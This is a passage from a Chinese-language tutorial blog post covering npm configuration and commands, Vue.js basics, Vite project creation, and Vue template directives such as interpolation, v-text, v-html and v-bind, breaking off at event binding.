<p>安装参考：<a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">菜鸟教程 - node.js的安装</a></p>
<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><p><strong>npm（Node Package Manager）</strong> 是 Node.js 的默认包管理工具。它不仅允许开发者轻松地安装、共享和分发代码库，还提供了一个庞大的开源库生态系统，帮助开发者快速构建应用而无需从零开始编写所有代码</p>
<p><strong>常用命令：</strong></p>
<p>1、配置依赖下载使用阿里镜像：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br><span class="line">// 默认源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure>

<p>查看配置情况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure>



<p>2、配置全局依赖下载后的存储位置</p>
<p>默认在 <strong>用户目录下AppData\Roaming\npm</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix <span class="string">&quot;path&quot;</span></span><br><span class="line">// 确认</span><br><span class="line">npm config get prefix</span><br></pre></td></tr></table></figure>



<p>3、升级npm版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g npm@9.6.6</span><br></pre></td></tr></table></figure>



<p>4、项目相关命令</p>
<p>查询依赖网站：<a href="http://www.npmjs.com/">www.npmjs.com</a></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>npm init</code></td>
<td>初始化一个新的 npm 项目，生成 <code>package.json</code> 文件。使用 <code>-y</code> 参数跳过交互式提示。</td>
</tr>
<tr>
<td><code>npm init -y</code></td>
<td>快速初始化一个新的 npm 项目，生成默认配置的 <code>package.json</code> 文件。</td>
</tr>
<tr>
<td><code>npm install &lt;package-name&gt;</code></td>
<td>安装指定包并将其添加到 <code>dependencies</code> 中。</td>
</tr>
<tr>
<td><code>npm install &lt;package-name&gt; --save-dev</code></td>
<td>安装指定包并将其添加到 <code>devDependencies</code> 中（开发环境依赖）。</td>
</tr>
<tr>
<td><code>npm install -g &lt;package-name&gt;</code></td>
<td>全局安装指定包，使其在系统范围内可用。</td>
</tr>
<tr>
<td><code>npm uninstall &lt;package-name&gt;</code></td>
<td>从项目中移除并卸载指定包。</td>
</tr>
<tr>
<td><code>npm uninstall &lt;package-name&gt; --save-dev</code></td>
<td>从项目中移除并卸载指定的开发依赖包。</td>
</tr>
<tr>
<td><code>npm uninstall -g &lt;package-name&gt;</code></td>
<td>全局卸载指定包。</td>
</tr>
<tr>
<td><code>npm update &lt;package-name&gt;</code></td>
<td>更新指定包到最新版本（根据 <code>package.json</code> 中定义的版本范围）。</td>
</tr>
<tr>
<td><code>npm update</code></td>
<td>更新所有依赖包到符合 <code>package.json</code> 中定义的版本范围的最新版本。</td>
</tr>
<tr>
<td><code>npm outdated</code></td>
<td>检查哪些包有新版本可用，并列出当前版本、想要的版本和最新的版本。</td>
</tr>
<tr>
<td><code>npm list</code></td>
<td>列出当前项目中安装的所有包。</td>
</tr>
<tr>
<td><code>npm list -g</code></td>
<td>列出全局安装的所有包。</td>
</tr>
<tr>
<td><code>npm run &lt;script-name&gt;</code></td>
<td>运行 <code>package.json</code> 中定义的自定义脚本。常见的脚本如 <code>start</code> 和 <code>test</code> 可以直接使用简写。</td>
</tr>
<tr>
<td><code>npm start</code></td>
<td>运行 <code>package.json</code> 中定义的 <code>start</code> 脚本（默认为 <code>node server.js</code>）。</td>
</tr>
<tr>
<td><code>npm test</code></td>
<td>运行 <code>package.json</code> 中定义的 <code>test</code> 脚本（常用于执行测试框架）。</td>
</tr>
<tr>
<td><code>npm login</code></td>
<td>登录 npm 用户账户，以便发布包。</td>
</tr>
<tr>
<td><code>npm publish</code></td>
<td>将当前项目发布为 npm 包。</td>
</tr>
<tr>
<td><code>npm version patch</code></td>
<td>更新项目的补丁版本号（例如从 <code>1.0.0</code> 更新到 <code>1.0.1</code>），然后可以发布更新后的包。</td>
</tr>
<tr>
<td><code>npm version minor</code></td>
<td>更新项目的次要版本号（例如从 <code>1.0.0</code> 更新到 <code>1.1.0</code>），然后可以发布更新后的包。</td>
</tr>
<tr>
<td><code>npm version major</code></td>
<td>更新项目的主要版本号（例如从 <code>1.0.0</code> 更新到 <code>2.0.0</code>），然后可以发布更新后的包。</td>
</tr>
<tr>
<td><code>npm info &lt;package-name&gt;</code></td>
<td>查看指定包的详细信息，包括版本、作者等。</td>
</tr>
<tr>
<td><code>npm root -g</code></td>
<td>查看全局安装路径。</td>
</tr>
<tr>
<td><code>npm explore &lt;package-name&gt; -- &lt;command&gt;</code></td>
<td>打开指定模块的源码目录并执行指定命令。</td>
</tr>
<tr>
<td><code>npm cache clean --force</code></td>
<td>清除 npm 缓存，解决某些安装问题。</td>
</tr>
<tr>
<td><code>npm config set proxy http://proxy-server:port</code></td>
<td>设置 npm 使用的 HTTP 代理服务器。</td>
</tr>
<tr>
<td><code>npm config set https-proxy http://proxy-server:port</code></td>
<td>设置 npm 使用的 HTTPS 代理服务器。</td>
</tr>
<tr>
<td><code>npm config list</code></td>
<td>查看当前 npm 配置。</td>
</tr>
</tbody></table>
<hr>
<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p><strong>Vue.js</strong> 是一个用于构建用户界面的渐进式 JavaScript 框架。它设计用于逐步采用，因此可以轻松地将其集成到现有项目中，也可以用于开发复杂的单页应用程序（SPA）。Vue 的核心库专注于视图层，但通过使用官方库和生态系统工具，如 Vue Router、Vuex 和 Vue CLI，你可以构建功能齐全的应用程序。<strong>声明式渲染和响应式</strong></p>
<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://cn.vuejs.org/guide/introduction.html">官方文档</a></p>
<h3 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h3><ol>
<li><strong>声明式渲染</strong>：Vue 使用基于 HTML 的模板语法，允许你声明性地将数据绑定到 DOM。</li>
<li><strong>组件化</strong>：Vue 允许你将应用程序拆分为独立且可复用的组件。</li>
<li><strong>响应式数据绑定</strong>：Vue 会自动追踪数据的变化，并在数据变化时更新视图。</li>
<li><strong>轻量级和高性能</strong>：Vue 的核心库非常轻量，同时提供了出色的性能。</li>
<li><strong>易于学习</strong>：Vue 的文档详尽且清晰，API 设计直观，使得初学者能够快速上手。</li>
</ol>
<h3 id="安装与环境配置"><a href="#安装与环境配置" class="headerlink" title="安装与环境配置"></a>安装与环境配置</h3><h4 id="安装-Vue"><a href="#安装-Vue" class="headerlink" title="安装 Vue"></a>安装 Vue</h4><p>你可以通过多种方式安装 Vue：</p>
<ol>
<li><p><strong>CDN 引入</strong>：适合快速原型开发或简单项目。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@next&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>npm 安装</strong>：适合现代前端工作流。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install vue</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Vue CLI</strong>：用于创建和管理 Vue 项目的脚手架工具。<br>首先，全局安装 Vue CLI：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure>
<p>然后，创建一个新的 Vue 项目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue create my-project</span><br><span class="line"><span class="built_in">cd</span> my-project</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Vue-CLI"><a href="#Vue-CLI" class="headerlink" title="Vue CLI"></a>Vue CLI</h3><p><strong>Vue CLI</strong> 是一个官方提供的命令行工具，用于快速搭建 Vue 项目结构并提供开发和生产环境的构建工具链。</p>
<h4 id="创建新项目"><a href="#创建新项目" class="headerlink" title="创建新项目"></a>创建新项目</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue create my-project</span><br><span class="line"><span class="built_in">cd</span> my-project</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><p>典型的 Vue CLI 项目结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my-project/</span><br><span class="line">├── node_modules/</span><br><span class="line">├── public/</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   └── favicon.ico</span><br><span class="line">├── src/</span><br><span class="line">│   ├── assets/</span><br><span class="line">│   ├── components/</span><br><span class="line">│   ├── App.vue</span><br><span class="line">│   └── main.js</span><br><span class="line">├── .gitignore</span><br><span class="line">├── babel.config.js</span><br><span class="line">├── package.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>





<h2 id="Vite工程化工具"><a href="#Vite工程化工具" class="headerlink" title="Vite工程化工具"></a>Vite工程化工具</h2><p>npm+vite &#x3D; maven</p>
<h3 id="创建Vue项目"><a href="#创建Vue项目" class="headerlink" title="创建Vue项目"></a>创建Vue项目</h3><p><strong>1、创建工程：</strong></p>
<p>在磁盘中创建一个空目录，在vscode中打开，在命令行中运行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm create vite</span><br></pre></td></tr></table></figure>

<p>然后输入工程名称；使用上下键导航光标，选择使用的框架（VUE)，回车；选择使用的语言（JavaScript），回车；</p>
<p>工程创建完毕。</p>
<p><strong>2、下载依赖</strong></p>
<p>工程创建完毕后，vite会在package.json文件中声明可能需要的依赖，但这些依赖处于未下载状态，需要手动下载。</p>
<p>在命令行中进入工程项目所在目录，运行如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i</span><br></pre></td></tr></table></figure>

<p>项目目录可见<code>node_modules</code>文件夹，依赖下载完成。</p>
<p><strong>3、vite构建命令脚本</strong></p>
<p>在<code>package.json</code> 中的 <code>scripts</code> 配置（如下）指明了当前可用的vite构建脚本命令。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以在命令行中执行对应脚本以完成相应支持：</p>
<ul>
<li>**<code>npm run dev</code>**：启动开发服务器，支持热更新，适合开发阶段使用。</li>
<li>**<code>npm run build</code>**：构建生产版本，生成优化后的静态文件，适合部署到生产环境。</li>
<li>**<code>npm run preview</code>**：预览构建后的生产版本，确保构建结果符合预期。</li>
</ul>
<p>除了上述基本脚本外，还可以根据需要添加更多的脚本以扩展功能。例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint . --ext .js,.vue --ignore-path .gitignore&quot;</span><span class="punctuation">,</span> <span class="comment">// 用于运行代码风格检查工具（如 ESLint）。</span></span><br><span class="line">  <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vitest&quot;</span><span class="punctuation">,</span>				<span class="comment">// 用于运行测试框架（如 Jest 或 Vitest）。</span></span><br><span class="line">  <span class="attr">&quot;serve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http-server dist&quot;</span>	<span class="comment">// 如使用其他工具（如http-server）来快速启动一个静态文件服务器，可以添加此脚本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="Vit-Vue3项目目录结构"><a href="#Vit-Vue3项目目录结构" class="headerlink" title="Vit+Vue3项目目录结构"></a>Vit+Vue3项目目录结构</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250121140835.png"></p>
<p>其他可能目录：</p>
<blockquote>
<p>layouts目录: 用于存放布局组件的文件</p>
<p>pages目录: 用于存放页面级别的组件文件</p>
<p>plugings目录: 用于存放vite插件相关文件</p>
<p>router目录: 用于存放vue.js的路由配置文件</p>
<p>store目录: 用于存放vuex状态管理相关文件</p>
<p>utils目录: 存放一些通用工具函数</p>
</blockquote>
<h3 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h3><p>在vue3框架中，通过.vue文件来管理组件（组件：前端页面中，多个页面可能存在相同的模块，可以将这些相同的代码提取成一个单独的组件，在不同文件引入即可）。<strong>单文件组件（SFC）</strong> 是 Vue.js 中一个非常重要的概念，它允许你在一个单独的文件中定义组件的模板、逻辑和样式。这种模式使得代码更加模块化、可维护，并且提高了开发效率。Vue 的单文件组件使用 <code>.vue</code> 文件扩展名。每个 <code>.vue</code> 文件通常包含三个主要部分：<code>&lt;template&gt;</code>、<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>，它们分别用于定义组件的模板、逻辑和样式。</p>
<p><strong>单文件组件的组成部分</strong></p>
<ol>
<li><p><code>&lt;template&gt;</code> 部分</p>
<ul>
<li><p><strong>作用</strong>：定义组件的 HTML 结构。内部只能有一个一级子标签。</p>
</li>
<li><p><strong>语法</strong>：使用标准的 HTML 语法，并支持 Vue 的指令（如 <code>v-bind</code>, <code>v-on</code> 等）和插值表达式（如 <code>&#123;&#123; &#125;&#125;</code>）。</p>
</li>
</ul>
</li>
<li><p><code>&lt;script&gt;</code> 部分</p>
<ul>
<li><strong>作用</strong>：定义组件的 JavaScript 逻辑。</li>
<li><strong>语法</strong>：通常使用 ES6 模块化的 <code>export default</code> 语法来导出一个对象，该对象包含了组件的各种选项，如 <code>data</code>、<code>methods</code>、<code>computed</code> 等。</li>
</ul>
</li>
<li><p><code>&lt;style&gt;</code>部分</p>
<ul>
<li><strong>作用</strong>：定义组件的 CSS 样式。</li>
<li><strong>语法</strong>：可以使用标准的 CSS 语法，也支持预处理器（如 Sass、Less）。通过添加 <code>scoped</code> 属性，可以确保样式仅应用于当前组件，避免全局样式冲突。</li>
</ul>
</li>
</ol>
<h3 id="工程文件间的逻辑关系"><a href="#工程文件间的逻辑关系" class="headerlink" title="工程文件间的逻辑关系"></a>工程文件间的逻辑关系</h3><p>说明:  两个主要文件分别是 <strong>HTML 入口文件</strong> index.html和 <strong>JavaScript 主入口文件</strong>main.js，它们共同构成了一个 Vue 应用的基础结构。<code>index.html</code>是一个标准的 HTML 文件，作为整个应用的入口点。它定义了页面的基本结构，并包含了一些必要的元数据和脚本引用。<code>main.js</code>是 Vue 应用的主要入口文件，负责创建和初始化 Vue 应用实例，并将其挂载到 HTML 文件中的指定 DOM 元素上。根组件可以再导入其他组件。</p>
<p><strong>工作流程:</strong></p>
<ol>
<li>**浏览器加载 <code>index.html</code>**：<ul>
<li>浏览器首先加载并解析 <code>index.html</code> 文件，识别出其中的 <code>&lt;script&gt;</code> 标签，该标签指向 <code>/src/main.js</code>。</li>
</ul>
</li>
<li><strong>执行 <code>main.js</code> 文件</strong>：<ul>
<li>当浏览器遇到 <code>&lt;script&gt;</code> 标签时，它会请求并加载 <code>/src/main.js</code> 文件。</li>
<li>在 <code>main.js</code> 文件中，首先导入必要的模块和组件。</li>
<li>使用 <code>createApp</code> 方法创建一个新的 Vue 应用实例，并将 <code>App.vue</code> 作为根组件。</li>
<li>最后，通过 <code>.mount(&#39;#app&#39;)</code> 将这个应用实例挂载到 HTML 文件中 ID 为 <code>app</code> 的 <code>div</code> 元素上。</li>
</ul>
</li>
<li><strong>Vue 应用渲染内容</strong>：<ul>
<li>Vue 应用启动后，它会根据 <code>App.vue</code> 组件的内容生成相应的 DOM 结构，并将其插入到 <code>index.html</code> 中的 <code>div#app</code> 元素内。</li>
<li>用户可以在浏览器中看到最终渲染后的页面。</li>
</ul>
</li>
</ol>
<p>文件内容如下：</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/vite.svg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite + Vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这个 div 是 Vue 应用挂载的目标元素。Vue 会将生成的内容渲染到这个 div 中。--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入了位于 /src/main.js 的 JavaScript 文件，该文件包含了启动 Vue 应用的主要逻辑。--&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入vue的createApp方法</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 导入全局CSS样式文件</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span></span><br><span class="line"><span class="comment">// 导入App组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="comment">// 通过vue创建一个app对象，并将app对象挂载到id为app的元素上</span></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="CSS样式导入"><a href="#CSS样式导入" class="headerlink" title="CSS样式导入"></a>CSS样式导入</h3><p>CSS样式可以通过以下方式导入：</p>
<ol>
<li>在<code>.vue</code>文件中的style标签中直接书写样式：适合只在本文件使用的样式.</li>
<li>将CSS样式保存到独立的.css文件中，有两种导入方式：<ol>
<li>在 <code>script</code> 标签中导入：<code>import &#39;./style/test.css&#39;;</code></li>
<li>在 <code>style</code> 标签中导入：<code>@import &#39;./style/test.css&#39;;</code></li>
</ol>
</li>
<li>如果某个样式需要在<strong>所有的</strong><code>.vue</code>文件中，可以在<code>main.js</code>文件中导入：&#96;import ‘.&#x2F;style&#x2F;test.css’</li>
</ol>
<h3 id="响应式数据和setup语法糖"><a href="#响应式数据和setup语法糖" class="headerlink" title="响应式数据和setup语法糖"></a>响应式数据和setup语法糖</h3><p>概念：</p>
<ul>
<li>响应式数据：在数据变化时，vue框架会将变量最新的值关系到dom树中</li>
<li>非响应式数据：在数据变化时，vue框架不会将变量最新的值关系到dom树中</li>
</ul>
<p>VUE数据处理：</p>
<ul>
<li><p>Vue2框架中，数据不做特殊处理时，默认是响应式的：</p>
</li>
<li><p>Vue3框架中，数据默认是非响应式的，需要经过<code>ref/reactive</code>函数的处理才是响应式的：</p>
<ul>
<li>ref &#x2F; reactive 函数使用时需要导入：<code>import &#123; ref &#125; from &quot;vue&quot;;</code><ul>
<li>在script标签中，操作ref的响应式数据需要通过<code>.value</code>形式操作</li>
<li>在template标签中，操作ref的响应式数据无需使用.value</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>setup语法糖：在script标签中添加setup后，即可直接在标签内书写响应式处理的代码，无需使用return等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="comment">// 在script标签中添加setup后，即可直接在标签内书写响应式处理的代码，无需使用return等。</span></span><br><span class="line"><span class="comment">// export default&#123;</span></span><br><span class="line"><span class="comment">//   setup()&#123;</span></span><br><span class="line">    <span class="comment">// 内部定义一些要展示到html中的数据 变量/对象</span></span><br><span class="line">    <span class="keyword">let</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">// 自增方法</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">countInc</span>(<span class="params"></span>) &#123;</span><br><span class="line">      count.<span class="property">value</span>++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">countDec</span>(<span class="params"></span>) &#123;</span><br><span class="line">      count.<span class="property">value</span>--</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//   return&#123;</span></span><br><span class="line">  <span class="comment">//     count,</span></span><br><span class="line">  <span class="comment">//     countInc,</span></span><br><span class="line">  <span class="comment">//     countDec</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>





<h3 id="插值表达式"><a href="#插值表达式" class="headerlink" title="插值表达式"></a>插值表达式</h3><p><code>&#123;&#123; &#125;&#125;</code>形式的代码在VUE中称为插值表达式，类似与占位符，但拥有更多的作用，详细见代码：</p>
<ul>
<li><p>插值表达式类似与占位符，可以将<code>&#123;&#123;&#125;&#125;</code>内变量的值渲染到页面中对应位置</p>
</li>
<li><p>插值表达式不依赖标签，可以没有标签</p>
</li>
<li><p>插值表达式中可以调用函数，将返回值渲染到对应位置 </p>
</li>
<li><p>插值表达式支持对象调用一些常见API</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  let msg = &quot;this is message&quot;</span><br><span class="line">  let age = 10</span><br><span class="line">  let bee = &quot;蜜 蜂&quot;</span><br><span class="line">  let getMsg = function()&#123;</span><br><span class="line">    return &quot;this is function&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;!-- 插值表达式的用法 --&gt;</span><br><span class="line">  &lt;!-- 将数据绑定到以下元素 --&gt;</span><br><span class="line">  &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 插值表达式不依赖标签，可以没有标签 --&gt;</span><br><span class="line">  msg的值为&#123;&#123; msg &#125;&#125; &lt;br&gt;</span><br><span class="line">  &lt;!-- 插值表达式中可以调用函数，将返回值渲染到对应位置 --&gt;</span><br><span class="line">  函数结果为：&#123;&#123; getMsg() &#125;&#125; &lt;br&gt;</span><br><span class="line">  &lt;!-- 插值表达式支持常见运算符 --&gt;</span><br><span class="line">  年龄：&#123;&#123; age &#125;&#125;，是否成年：&#123;&#123; age&gt;18?&#x27;是&#x27;:&#x27;否&#x27; &#125;&#125; &lt;br&gt;</span><br><span class="line">  &lt;!-- 插值表达式支持对象调用一些常见API --&gt;</span><br><span class="line">  &#123;&#123; bee.split(&#x27; &#x27;).reverse().join(&#x27; &#x27;) &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h3 id="渲染命令"><a href="#渲染命令" class="headerlink" title="渲染命令"></a>渲染命令</h3><p><code>v-***</code>类型的代码是VUE的渲染命令。</p>
<ul>
<li><p>命令必须<strong>依赖标签</strong>，在开始标签（开始标签<code>&lt;h1&gt;</code>结束标签<code>&lt;/h1&gt;</code>）中使用。</p>
</li>
<li><p>命令中支持<strong>字符串模板</strong>，模板字符串也可以直接写在命令中</p>
</li>
<li><p>命令中支持<strong>常见运算符</strong></p>
</li>
<li><p>命令中支持<strong>常见API</strong></p>
</li>
<li><p>命令中支持<strong>函数调用</strong>，并将结果作为需要显示的信息</p>
</li>
</ul>
<h4 id="文本渲染命令"><a href="#文本渲染命令" class="headerlink" title="文本渲染命令"></a>文本渲染命令</h4><p>包括以下两个：</p>
<ul>
<li><em><code> v-text</code></em> ：不能识别HTML文本，html文本会按普通文本处理，直接显示</li>
<li><em><code>v-html</code></em> ： 能够识别HTML文本，html文本会按 html 语法处理，但必须使用字符串变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">  let msg = &quot;this is message&quot;</span><br><span class="line">  let msg1 = `hello $&#123;msg&#125;`</span><br><span class="line">  let age = 10</span><br><span class="line">  let bee = &quot;蜜 蜂&quot;</span><br><span class="line">  function getMsg()&#123;</span><br><span class="line">    return &quot;this is function&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  let html = &quot;&lt;h2&gt;你好&lt;/h2&gt;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;msg&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 命令中支持字符串模板 --&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;msg1&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 模板字符串也可以直接写在命令中 --&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;`hello world $&#123;msg&#125;`&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 命令中支持常见运算符 --&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;age&gt;=18?&#x27;成年&#x27;:&#x27;未成年&#x27;&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 命令中支持常见API --&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;bee.split(&#x27; &#x27;).reverse().join(&#x27;&#x27;)&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- 命令中支持函数调用，并将结果作为需要显示的信息 --&gt;</span><br><span class="line">  &lt;h1 v-text=&quot;getMsg()&quot;&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;!-- v-html可以识别html文本并按语法处理，但必须使用字符串变量 --&gt;</span><br><span class="line">  &lt;h1 v-html=&quot;html&quot;&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="属性渲染命令"><a href="#属性渲染命令" class="headerlink" title="属性渲染命令"></a>属性渲染命令</h4><p>主要有一个：</p>
<ul>
<li>*<code>v-bind</code>*：将数据绑定到元素属性上</li>
<li><strong>v-bind:属性名</strong> 可以简写成 <strong>:属性名</strong></li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"> let pic =&#123;</span><br><span class="line">  org:&quot;https://bing.iamdt.cn/&quot;,</span><br><span class="line">  name:&quot;风景照&quot;,</span><br><span class="line">  url:&quot;https://cn.bing.com/th?id=OHR.TetonSunrise_EN-US0849252457_UHD.jpg&quot;</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;!-- v-bind:属性名 可以简写成 :属性名 --&gt;</span><br><span class="line">  &lt;a :href=&quot;pic.org&quot;&gt;&lt;img v-bind:src=&quot;pic.url&quot;v-bind:title=&quot;pic.name&quot;&gt;&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>



<h4 id="事件绑定命令"><a href="#事件绑定命令" class="headerlink" title="事件绑定命令"></a>事件绑定命令</h4><p>使用<code>v-on</code>命令：</p>
<ul>
<li>语法：<code>v-on:事件名称=&quot;函数名&quot;</code></li>
